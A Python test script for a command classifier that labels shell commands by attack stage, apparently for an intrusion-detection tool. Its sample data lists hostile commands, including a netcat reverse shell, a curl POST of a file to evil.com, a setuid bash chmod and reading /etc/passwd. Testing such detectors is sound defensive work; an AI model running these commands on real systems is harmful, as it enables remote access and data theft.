"""
Simple test script for the command classifier.
Run this script to test if the ML components are working properly.
"""
import sys
import os
from pathlib import Path
import json

# Add parent directory to path to allow importing modules
parent_dir = str(Path(__file__).parent.parent)
if parent_dir not in sys.path:
    sys.path.insert(0, parent_dir)

from ml.command_analyzer import CommandClassifier

def test_classifier():
    """
    Test the command classifier with sample commands.
    """
    print("Initializing command classifier...")
    classifier = CommandClassifier()
    
    # Test commands for each category
    test_commands = {
        'reconnaissance': ['ls -la', 'ps aux', 'cat /etc/passwd', 'ifconfig', 'netstat -an'],
        'persistence': ['crontab -e', 'useradd -m hacker', 'ssh-keygen', 'touch ~/.bashrc'],
        'privilege_escalation': ['sudo su -', 'chmod u+s /bin/bash', 'find / -perm -4000'],
        'lateral_movement': ['ssh user@10.0.0.5', 'scp file.txt user@host:/path', 'nc -e /bin/sh 10.0.0.5 4444'],
        'data_exfiltration': ['tar -czvf data.tar.gz /etc', 'base64 -w 0 secret.txt', 'curl -X POST -d @data.txt evil.com'],
        'miscellaneous': ['cd /tmp', 'echo "test"', 'touch newfile.txt', 'mkdir test_dir']
    }
    
    # Run tests
    results = {}
    print("\nTesting classifier with sample commands...")
    print("-----------------------------------------")
    
    for category, commands in test_commands.items():
        results[category] = {'correct': 0, 'total': len(commands)}
        print(f"\nCategory: {category}")
        print("-" * (len(category) + 10))
        
        for cmd in commands:
            prediction = classifier.predict(cmd)
            predicted_category = prediction['category']
            confidence = prediction['confidence']
            
            # Check if prediction matches expected category
            is_correct = predicted_category == category
            if is_correct:
                results[category]['correct'] += 1
                
            # Print result with color coding (green for correct, red for incorrect)
            status = "CORRECT" if is_correct else "INCORRECT"
            print(f"Command: '{cmd}'")
            print(f"  Predicted: {predicted_category} (confidence: {confidence:.2f})")
            print(f"  Expected: {category}")
            print(f"  Status: {status}\n")
    
    # Calculate overall accuracy
    total_correct = sum(cat['correct'] for cat in results.values())
    total_commands = sum(cat['total'] for cat in results.values())
    accuracy = total_correct / total_commands if total_commands > 0 else 0
    
    print("=" * 40)
    print(f"Overall accuracy: {accuracy:.2%} ({total_correct}/{total_commands})")
    print("=" * 40)
    
    # Try batch prediction on mixed commands
    print("\nTesting batch prediction...")
    mixed_commands = ['ls -la', 'sudo su', 'scp secret.txt remote:/tmp', 'mkdir hidden_dir']
    batch_results = classifier.batch_predict(mixed_commands)
    
    print("\nBatch prediction results:")
    for result in batch_results:
        print(f"Command: '{result['command']}'")
        print(f"  Predicted: {result['category']} (confidence: {result['confidence']:.2f})\n")
    
    # Test insight generation
    print("\nGenerating insights from sample commands...")
    cmd_list = [cmd for cmds in test_commands.values() for cmd in cmds]
    insights = classifier.get_insights(cmd_list)
    
    print("\nInsight Results:")
    print(f"Total commands analyzed: {insights['total_commands']}")
    print(f"Attack focus: {insights['attack_focus']}")
    
    print("\nCategory distribution:")
    for category, percentage in insights['category_percentages'].items():
        print(f"  {category}: {percentage:.1f}%")
    
    return classifier

if __name__ == "__main__":
    print("Command Classifier Test")
    print("======================")
    classifier = test_classifier()
